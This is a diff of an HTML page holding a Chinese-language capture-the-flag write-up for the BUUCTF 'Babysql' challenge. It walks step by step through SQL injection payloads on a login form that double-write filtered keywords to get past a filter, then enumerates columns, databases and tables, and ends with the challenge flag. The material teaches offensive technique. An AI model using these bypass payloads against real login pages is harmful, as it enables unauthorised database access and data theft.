@@ -1,173 +1,133 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-CN" data-scheme="dark">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SQL注入 WP</title>
-<style>
-    * {
-        box-sizing: border-box;
-    }
-    body {
-        background: #121212;
-        color: #e0e0e0;
-        font-family: "Microsoft YaHei", sans-serif;
-        line-height: 1.6;
-        padding: 20px;
-    }
-    .container {
-        max-width: 900px;
-        margin: 0 auto;
-        background: #1e1e1e;
-        padding: 30px;
-        border-radius: 12px;
-        border: 1px solid #333;
-    }
-    h1 {
-        color: #fff;
-        font-size: 22px;
-        margin-bottom: 20px;
-    }
-    p {
-        margin: 10px 0;
-    }
-
-    /* 代码块样式 */
-    .code-block {
-        background: #1a1a1a;
-        border-radius: 6px;
-        padding: 14px;
-        margin: 12px 0;
-        border: 1px solid #444;
-        overflow-x: auto;
-    }
-    .code-block pre {
-        margin: 0;
-        font-family: Consolas, monospace;
-        font-size: 14px;
-        color: #dcdcaa;
-        white-space: pre;
-        line-height: 1.3;
-    }
-
-    /* 行号样式 */
-    .line {
-        display: block;
-        white-space: pre;
-    }
-    .line::before {
-        content: attr(data-line);
-        display: inline-block;
-        min-width: 2.2em;
-        text-align: right;
-        padding-right: 0.8em;
-        margin-right: 0.8em;
-        color: #888;
-        border-right: 1px solid #333;
-        user-select: none;
-    }
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL注入 WP</title>
+  <link rel="stylesheet" href="../../../style.css">
 </head>
 <body>
-<div class="container">
 
-<h1>SQL注入 双写绕过 WP</h1>
-<h2>0x01 SQL注入</h2>
-<p>看到登录页直接sql注入</p>
+<div class="wp-content" data-category="web" data-competition="BUUCTF" data-challenge="Babysql" data-difficulty="easy" data-date="2026-04-16">
+  <h1 class="wp-title">SQL注入 双写绕过 WP</h1>
 
-<div class="code-block"><pre>user: 1'union  select 1#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x01 SQL注入</h2>
+    <p>看到登录页直接sql注入</p>
+    <div class="ide"><pre>user: 1'union  select 1#&password=1</pre></div>
+    <p>密码任意</p>
+    <p>回显：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1#&passwd=1' and password='1' 1#&passwd=1'' at line 1</p>
+    <p>可以发现这里union select都被过滤了</p>
+    <p>那就尝试双写绕过</p>
+  </div>
 
-<p>密码任意</p>
-<p>回显：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1#&passwd=1' and password='1’ 1#&passwd=1'' at line 1</p>
-<p>可以发现这里union select都被过滤了</p>
-<p>那就尝试双写绕过</p>
-<h2>0x02 SQL注入-双写绕过</h2>
-<div class="code-block"><pre>user: 1'ununionion seselectlect 1#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x02 SQL注入-双写绕过</h2>
+    <div class="ide"><pre>user: 1'ununionion seselectlect 1#&password=1</pre></div>
+    <p>密码任意</p>
+    <p>回显：The used SELECT statements have a different number of columns</p>
+    <p>显示列数不同，发现双写绕过是可行的</p>
+    <p>那就继续试列数</p>
+  </div>
 
-<p>密码任意</p>
-<p>回显：The used SELECT statements have a different number of columns</p>
-<p>显示列数不同，发现双写绕过是可行的</p>
-<p>那就继续试列数</p>
-<h2>0x03 SQL注入-双写绕过-列数</h2>
-<div class="code-block"><pre>user: 1'ununionion seselectlect 1,2,3#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x03 SQL注入-双写绕过-列数</h2>
+    <div class="ide"><pre>user: 1'ununionion seselectlect 1,2,3#&password=1</pre></div>
+    <p>密码任意</p>
+    <p>回显：</p>
+    <p>Hello 2！</p>
+    <p>Your password is '3'</p>
+    <p>找到正确列数三列</p>
+    <p>接下来查询数据库</p>
+  </div>
 
-<p>密码任意</p>
-<p>回显：</p>
-<p>Hello 2！</p>
-<p>Your password is '3'</p>
-<p>找到正确列数三列</p>
-<p>接下来查询数据库</p>
-<h2>0x04 SQL注入-双写绕过查询数据库</h2>
-<div class="code-block"><pre>user: 1'ununionion seselectlect 1,version (),database()#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x04 SQL注入-双写绕过查询数据库</h2>
+    <div class="ide"><pre>user: 1'ununionion seselectlect 1,version (),database()#&password=1</pre></div>
+    <p>密码任意</p>
+    <p>回显：</p>
+    <p>Hello 10.3.18-MariaDB！</p>
+    <p>Your password is 'geek'</p>
+    <p>成功显示数据库</p>
+    <p>接着查询表名</p>
+  </div>
 
-<p>密码任意</p>
-<p>回显：</p>
-<p>Hello 10.3.18-MariaDB！</p>
-<p>Your password is 'geek'</p>
-<p>成功显示数据库</p>
-<p>接着查询表名</p>
-<h2>0x05 SQL注入-双写绕过查询表名</h2>
-<div class="code-block"><pre>user: 1'ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x05 SQL注入-双写绕过查询表名</h2>
+    <div class="ide"><pre>user: 1'ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1</pre></div>
+    <p>密码任意</p>
+    <p>回显：</p>
+    <p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '.tables table_schema=database()#&passwd=1' and password='1' 1#&passwd=1'' at line 1</p>
+    <p>可看出information,from被过滤</p>
+    <p>继续双写绕过</p>
+  </div>
 
-<p>密码任意</p>
-<p>回显：</p>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '.tables table_schema=database()#&passwd=1' and password='1’ 1#&passwd=1'' at line 1</p>
-<p>可看出information,from被过滤</p>
-<p>继续双写绕过</p>
-<h2>0x06 SQL注入-双写绕过查询表名-双写绕过</h2>
-<div class="code-block"><pre>user: 1'ununionion seselectlect 1,2,group_concat(table_name) frfromom inforinformationmation_schema.tables where table_schema=database()#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x06 SQL注入-双写绕过查询表名-双写绕过</h2>
+    <div class="ide"><pre>user: 1'ununionion seselectlect 1,2,group_concat(table_name) frfromom inforinformationmation_schema.tables where table_schema=database()#&password=1</pre></div>
+    <p>回显：</p>
+    <p>Table 'infinfmationmation_schema.schemata' doesn't exist</p>
+    <p>发现他只删除了or所以只需要双写or</p>
+  </div>
 
-<p>回显：</p>
-<p>Table 'infinfmationmation_schema.schemata' doesn't exist</p>
-<p>发现他只删除了or所以只需要双写or</p>
-<h2>0x07 SQL注入-双写绕过查询表名-双写绕过OR</h2>
-<div class="code-block"><pre>user: 1'ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x07 SQL注入-双写绕过查询表名-双写绕过OR</h2>
+    <div class="ide"><pre>user: 1'ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#&password=1</pre></div>
+    <p>回显：</p>
+    <p>Hello 2！</p>
+    <p>Your password is 'information_schema,performance_schema,test,mysql,ctf,geek'</p>
+    <p>可看出所有的数据库information_schema,mysql ,performance_schema,test,ctf,geek</p>
+    <p>查询表名继续使用联合查询需要双写的有information，from，where</p>
+  </div>
 
-<p>回显：</p>
-<p>Hello 2！</p>
-<p>Your password is 'information_schema,performance_schema,test,mysql,ctf,geek'</p>
-<p>可看出所有的数据库information_schema,mysql ,performance_schema,test,ctf,geek</p>
-<p>查询表名继续使用联合查询需要双写的有information，from，where</p>
-<h2>0x08 SQL注入-双写绕过查询表名-双写绕过联合查询</h2>
-<div class="code-block"><pre>user: 1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x08 SQL注入-双写绕过查询表名-双写绕过联合查询</h2>
+    <div class="ide"><pre>user: 1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#&password=1</pre></div>
+    <p>回显：</p>
+    <p>Hello 2！</p>
+    <p>Your password is 'b4bsql,geekuser'</p>
+    <p>得到geek数据库里的表b4bsql,geekuser，发现flag不在此数据库中</p>
+    <p>因此直接试ctf的表</p>
+  </div>
 
-<p>回显：</p>
-<p>Hello 2！</p>
-<p>Your password is 'b4bsql,geekuser'</p>
-<p>得到geek数据库里的表b4bsql,geekuser，发现flag不在此数据库中</p>
-<p>因此直接试ctf的表</p>
-<h2>0x09 SQL注入-双写绕过查询表名-双写绕过联合查询-查询ctf数据库</h2>
-<div class="code-block"><pre>user: 1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf'#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x09 SQL注入-双写绕过查询表名-双写绕过联合查询-查询ctf数据库</h2>
+    <div class="ide"><pre>user: 1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf'#&password=1</pre></div>
+    <p>回显：</p>
+    <p>Hello 2！</p>
+    <p>Your password is 'Flag'</p>
+    <p>发现ctf数据库中存在Flag表</p>
+    <p>接着查询flag中内容</p>
+  </div>
 
-<p>回显：</p>
-<p>Hello 2！</p>
-<p>Your password is 'Flag'</p>
-<p>发现ctf数据库中存在Flag表</p>
-<p>接着查询flag中内容</p>
-<h2>0x10 SQL注入-双写绕过查询表名-双写绕过联合查询-查询ctf数据库-查询flag</h2>
-<div class="code-block"><pre>user: 1’ ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#&password=1</pre></div>
+  <div class="wp-section">
+    <h2>0x10 SQL注入-双写绕过查询表名-双写绕过联合查询-查询ctf数据库-查询flag</h2>
+    <div class="ide"><pre>user: 1' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#&password=1</pre></div>
+    <p>回显：</p>
+    <p>Hello 2！</p>
+    <p>Your password is 'flag{341e1f75-ab86-40bf-81d6-53a97e2a8081}'</p>
+  </div>
 
-<p>回显：</p>
-<p>Hello 2！</p>
-<p>Your password is 'flag{341e1f75-ab86-40bf-81d6-53a97e2a8081}'</p>
-<h2>0x11 Flag</h2>
-<div class="code-block"><pre>flag{341e1f75-ab86-40bf-81d6-53a97e2a8081}</pre></div>
+  <div class="wp-section">
+    <h2>0x11 Flag</h2>
+    <div class="ide"><pre>flag{341e1f75-ab86-40bf-81d6-53a97e2a8081}</pre></div>
+  </div>
 </div>
 
 <script>
-// 自动给所有代码块加行号
-document.querySelectorAll('.code-block pre').forEach(pre => {
-  const lines = pre.textContent.split('\n');
-  pre.innerHTML = '';
-  lines.forEach((line, idx) => {
-    let el = document.createElement('span');
-    el.className = 'line';
-    el.setAttribute('data-line', idx + 1);
-    el.textContent = line;
-    pre.appendChild(el);
-  });
-});
+document.querySelectorAll('.ide pre').forEach(pre => {
+  const lines = pre.textContent.split('\n')
+  pre.innerHTML = ''
+  lines.forEach((line, i) => {
+    const span = document.createElement('span')
+    span.className = 'line'
+    span.setAttribute('data-line', i + 1)
+    span.textContent = line
+    pre.appendChild(span)
+  })
+})
 </script>
 
+<script src="../../../wp-script.js"></script>
 </body>
 </html>
